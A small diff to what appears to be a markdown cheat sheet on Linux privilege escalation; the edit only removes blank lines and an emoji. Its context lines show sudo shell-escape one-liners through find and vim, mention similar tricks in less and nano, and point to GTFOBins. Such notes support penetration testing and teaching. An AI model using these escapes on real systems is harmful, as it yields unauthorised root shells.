@@ -94,17 +94,13 @@ sudo -l
     ```bash
     sudo find . -exec /bin/sh \\; -quit
     ```
-    
 - `vim`:
-    
     ```bash
     sudo vim -c ':!sh'
     ```
-    
 - `less`, `nano`: similar `:!bash` or `^R^X` tricks.
-    
 
-✅ Always check [GTFOBins](https://gtfobins.github.io/).
+Always check [GTFOBins](https://gtfobins.github.io/).
 
 ---
 
